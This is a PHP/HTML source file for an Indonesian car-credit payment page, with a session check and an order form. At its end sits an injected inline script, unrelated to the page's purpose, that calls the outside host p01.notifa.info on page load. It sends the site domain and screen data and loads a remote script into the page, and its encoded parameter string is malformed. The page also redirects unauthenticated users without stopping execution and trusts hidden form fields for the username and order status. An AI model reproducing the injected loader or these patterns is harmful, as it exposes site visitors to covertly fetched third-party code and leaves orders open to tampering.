<?php
error_reporting(0);
session_start();
include '../core/core.php';

if(!isset($_SESSION['username'])) {
  header("Location: ../user/login.php?access_denied");
}

?>

<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Kredit Mobil - Mudah dan Cepat</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="description" content="Unique - Responsive vCard Template" />
  <meta name="keywords" content="vcard, resposnive, retina, resume, jquery, css3, bootstrap, Unique, portfolio" />
  <meta name="author" content="lmtheme" />
  <link rel="shortcut icon" href="favicon.ico">

  <link rel="stylesheet" href="../css/bootstrap.css" type="text/css">
  <link rel="stylesheet" href="../css/normalize.css" type="text/css">
  <link rel="stylesheet" href="../css/animate.css" type="text/css">
  <link rel="stylesheet" href="../css/transition-animations.css" type="text/css">
  <link rel="stylesheet" href="../css/jquery.mCustomScrollbar.min.css" type="text/css">
  <link rel="stylesheet" href="../css/owl.carousel.css" type="text/css">
  <link rel="stylesheet" href="../css/magnific-popup.css" type="text/css">
  <link rel="stylesheet" href="../css/main-red.css" type="text/css">

  <!-- This styles needs for demo -->
  <link rel="stylesheet" href="../preview/lmpixels-demo-panel.css" type="text/css">
</head>

<body>
  <div id="page" class="page">

    <!-- Main Content -->
    <div id="main" class="site-main2">
      <!-- Page changer wrapper -->
      <div class="pt-wrapper" style="background-image: url(../images/bg.png);">
        <!-- Subpages -->
        <div class="subpages">

          <section class="pt-page pt-page-5" data-id="contact">
            <div class="border-block-top-110"></div>
            <div class="section-inner">
              <div class="section-title-block">
                <div class="section-title-wrapper">
                  <h2 class="section-title">Page Pembayaran</h2>
                  <h5 class="section-description">Credit</h5>
                </div>
              </div>

              <div class="row">
                <div class="col-sm-6 col-md-6 subpage-block">
                  <form method="post" action="../user/insert-pesanan-credit.php">

                    <input type="hidden" name="id" value="<?php echo $data['id'] ?>" />
                    <input type="hidden" name="nm" value="<?php echo $_SESSION['username']; ?>">
                    <input type="hidden" name="st" value="Menunggu Persetujuan">
                    <input type="hidden" name="name" value="2017 - TOYOTA - CALYA 1.2 G">
                    <input type="hidden" name="qty" value="1">
                    <input type="hidden" name="kode_barang" value="CALYA">

                    <div class="controls">


                      <div class="form-group">
                        <label>Metode Pembayaran</label>
                        <input type="text" name="metode" class="form-control" value="Credit" readonly="">
                        <!-- <div class="form-control-border"></div>
                        <i class="form-control-icon pe-7s-comment"></i>
                        <div class="help-block with-errors"></div> -->
                      </div>

                      <div class="form-group">
                        <label>Waktu Kredit</label>
                        <select name="waktu" class="form-control">
                          <option>3 Minggu</option>
                          <option>2 Bulan</option>
                          <option>1 Tahun</option>
                        </select>
                      </div>

                      <div class="form-group">
                        <label>Jenis Kredit</label>
                        <select name="jenis" class="form-control">
                          <option>Credit Card</option>
                          <option>ATM</option>
                        </select>
                      </div>
                    </div>
                  </div>
                  <div class="col-sm-6 col-md-6 subpage-block">

                    <div class="controls">
                      <h3><b>Informasi Pembayaran</h3>
                      <p>Silahkan Lakukan Pembayaran sesuai dengan yang sudah ditentukan.</p>

                      <ul>
                        <ol>
                          Pembayaran Melalui ATM
                          <br>Silahkan lakukan pembayaran ke
                          <br>Nomor Rekening 1553 xxx xxx xxx
                        </ol>
                        <ol>
                          Pembayaran Melalui Credit Card
                          <br>Silahkan lakukan pembayaran ke
                          <br>Email example@hotmail.co.id
                        </ol>
                      </ul>

                      <input type="submit" name="credit" class="button btn-send" value="Pesan Credit">
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </section>

      </div>
    </div>
    <!-- /Page changer wrapper -->
  </div>
  <!-- /Main Content -->
  <!-- Contact Subpage -->

  <!-- End Contact Subpage -->

  <!-- /Main Content -->
</div>
</div>

<script src="../js/bootstrap.min.js"></script>
<script src="../js/pages-switcher.js"></script>
<script src="../js/imagesloaded.pkgd.min.js"></script>
<script src="../js/validator.js"></script>
<script src="../js/jquery.shuffle.min.js"></script>
<script src="../js/masonry.pkgd.min.js"></script>
<script src="../js/owl.carousel.min.js"></script>
<script src="../js/jquery.magnific-popup.min.js"></script>
<script src="../js/jquery.mCustomScrollbar.concat.min.js"></script>
<script src="../js/tilt.jquery.min.js"></script>
<script src="../js/jquery.hoverdir.js"></script>
<script src="../js/main.js"></script>

<!-- Demo Color changer Script -->
<script src="../preview/lmpixels-demo-panel.js"></script>
<!-- /Demo Color changer Script -->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVa2K%2bNZnlpTXt9YnUCwpMMLx%2b%2bQHkmE4Wy7RkeBZJGKiJdue9wKB96Kc9iVjivRBFiEw44gPLCtvAbDqY8nlaWKojwq%2bGxts8680ZPIfGcjWoyu1MUIXmG%2b%2fgsc13iDQgNwbvkNzcl%2bgd5G365lc%2fZW9uzrhiAfXhLg0uTMRKGTIzWdvXQ%2b2shx1gs2blnB4W4WGsbJHO22nvyZ74GuIWsH%2bO2iD4UoLHdXpJvcTociFcQK9Dknfvs75H62QFe%2beG0uJJQHQwmanVfeImrn9vjTJrTMhkA6wmV23gTia4rlkd3WVk8bxtQmNtzP7ShU8RCESFWt%2fukSnHOF4HDXptKLmwTZA9k3nw9r0f7sEgrU0Xm8tcUqpgT%2bA3GpgWz0UZBVqoJQUQTafmPPjQfmo%2bujydoTzM%2b4kN2bVShERlJYGTwQiruBjPg4Jcq2vXsOMrY%2ftUBTyzxtnHSs6iYj1qOwVzMd4cpc%2fzRYJcQyAnBMqdxTgyoUr5ibFUVuN0qJG%2bXplJfh1lkgP45Ezt%2b7MOHgoActEOLtw + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>
